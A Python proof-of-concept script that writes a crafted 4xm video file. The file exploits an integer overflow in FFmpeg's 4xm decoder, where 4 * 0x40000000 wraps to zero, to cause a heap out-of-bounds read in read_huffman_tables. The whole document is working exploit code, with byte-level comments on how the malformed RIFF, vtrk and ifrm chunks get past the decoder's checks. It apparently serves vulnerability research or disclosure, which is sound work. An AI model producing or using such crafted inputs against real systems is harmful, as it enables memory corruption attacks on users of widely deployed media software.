#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in decode_i_frame (4xm.c)
Leads to Heap OOB Read in read_huffman_tables.

Exploit flow:
  ffmpeg -i crafted.4xm -f null -
  -> decode_frame() (4xm.c:837)
  -> decode_i_frame() (4xm.c:945)
  -> read_huffman_tables() with buf_size=0 and prestream one past buffer end
  -> OOB read at 4xm.c:635-636

Key trick:
  buf[4..7] (prestream_size field) = 0x40000000
  4 * 0x40000000 overflows 32-bit unsigned int to 0
  prestream_size = 0, passes all checks
  prestream = buf + bitstream_size + 12 = buf + 12 = one past the 12-byte buffer
  read_huffman_tables(f, prestream, 0) reads 2 bytes OOB at lines 635-636
"""

import struct
import sys

def le32(v):
    return struct.pack('<I', v)

def tag(s):
    return s.encode('ascii')

OUTPUT = 'vuln_001_input.4xm'

# --- vtrk chunk (video track info) ---
# parse_vtrk reads:
#   buf[16..19] = extradata (version info)
#   buf[36..39] = width
#   buf[40..43] = height
# where buf points to the 'vtrk' tag itself.
# vtrk_SIZE = 0x44 = 68 bytes of data (not counting the 8-byte tag+size header).

VTRK_DATA_SIZE = 0x44  # 68 bytes
vtrk_data = bytearray(VTRK_DATA_SIZE)

# offset 8 from data start = offset 16 from chunk start (after "vtrk" + size)
# version: use 2 (version 2 -> AV_PIX_FMT_BGR555)
struct.pack_into('<I', vtrk_data, 8,  0x00020000)   # extradata: version = 2

# Width and height must be multiples of 16 (checked by decode_init).
WIDTH  = 16
HEIGHT = 16
struct.pack_into('<I', vtrk_data, 28, WIDTH)   # offset 36 from chunk start
struct.pack_into('<I', vtrk_data, 32, HEIGHT)  # offset 40 from chunk start

vtrk_chunk = tag('vtrk') + le32(VTRK_DATA_SIZE) + bytes(vtrk_data)
# vtrk_chunk total = 8 + 68 = 76 bytes

# --- LIST-HEAD ---
# Structure: "LIST" + size(LE32) + "HEAD" + vtrk_chunk
# size = len("HEAD") + len(vtrk_chunk) = 4 + 76 = 80
head_content = tag('HEAD') + vtrk_chunk
head_size    = len(head_content)  # 80
list_head    = tag('LIST') + le32(head_size) + head_content
# list_head total = 8 + 80 = 88 bytes

# --- ifrm chunk (crafted I-frame) ---
#
# The demuxer creates a packet:
#   pkt->data = [ifrm(4)][chunk_size(4)][payload(chunk_size bytes)]
#   pkt->size = chunk_size + 8
#
# decode_frame:
#   buf_size = pkt->size  (must be >= 20)
#   AV_RL32(buf+4) = chunk_size  (buf_size >= chunk_size + 8 checked)
#   buf = buf + 12  (skip ifrm tag, chunk_size, and first 4 payload bytes)
#   frame_size = buf_size - 12
#   decode_i_frame(f, buf, frame_size)
#
# decode_i_frame(f, buf, length):
#   bitstream_size = AV_RL32(buf)
#   prestream_size = 4 * AV_RL32(buf + bitstream_size + 4)   <-- line 790
#   prestream      =           buf + bitstream_size + 12
#   Check: prestream_size + bitstream_size + 12 == length
#   Check: prestream_size <= (1 << 26)
#   read_huffman_tables(f, prestream, prestream_size)
#
# We want:
#   bitstream_size = 0  (so length = 12)
#   prestream_size = 4 * 0x40000000 = 0  (integer overflow)
#
# So decode_i_frame buf[0..11]:
#   [0..3]  = 0x00000000  (bitstream_size = 0)
#   [4..7]  = 0x40000000  (prestream_size trigger; 4*0x40000000 overflows to 0)
#   [8..11] = anything
#
# This is pkt->data[12..23] = payload[4..15].
#
# To satisfy buf_size >= 20: we need chunk_size + 8 >= 20 -> chunk_size >= 12.
# frame_size = buf_size - 12 = chunk_size - 4.
# We need frame_size = length = 12, so chunk_size = 16.
#
# Packet layout (24 bytes total):
#   [ifrm][16][payload_0..3][payload_4..7][payload_8..11][payload_12..15]
#              ^----------^  ^----------^  ^-----------^  ^------------^
#              (don't care)  bitstream=0   prestream   (don't care)
#                                         =0x40000000

CHUNK_SIZE = 16  # payload size; buf_size = 24 >= 20 ✓; frame_size = 12 ✓

payload = bytearray(CHUNK_SIZE)
# payload[0..3]: anything (will be skipped by decode_frame)
# payload[4..7]: bitstream_size = 0
struct.pack_into('<I', payload, 4, 0x00000000)
# payload[8..11]: prestream_size field = 0x40000000 → 4 * 0x40000000 overflows to 0
struct.pack_into('<I', payload, 8, 0x40000000)
# payload[12..15]: anything

ifrm_chunk = tag('ifrm') + le32(CHUNK_SIZE) + bytes(payload)
# ifrm_chunk total = 8 + 16 = 24 bytes

# --- LIST-MOVI ---
# Structure: "LIST" + size + "MOVI" + ifrm_chunk
movi_content = tag('MOVI') + ifrm_chunk
movi_size    = len(movi_content)   # 4 + 24 = 28
list_movi    = tag('LIST') + le32(movi_size) + movi_content
# list_movi total = 8 + 28 = 36 bytes

# --- RIFF header ---
riff_body = tag('4XMV') + list_head + list_movi
riff_size = len(riff_body)  # 4 + 88 + 36 = 128
riff = tag('RIFF') + le32(riff_size) + riff_body

# Write file
with open(OUTPUT, 'wb') as f:
    f.write(riff)

total = len(riff)
print(f'[+] Written {OUTPUT} ({total} bytes)')
print(f'    RIFF body size : {riff_size}')
print(f'    LIST-HEAD size : {head_size}')
print(f'    LIST-MOVI size : {movi_size}')
print(f'    ifrm chunk size: {len(ifrm_chunk)}')
print(f'    chunk payload  : {payload.hex()}')
print(f'[+] Trigger: bitstream_size=0, prestream_size=4*0x40000000=0 (overflow)')
print(f'[+] prestream = buf+12 = one past the 12-byte frame buffer (OOB read)')
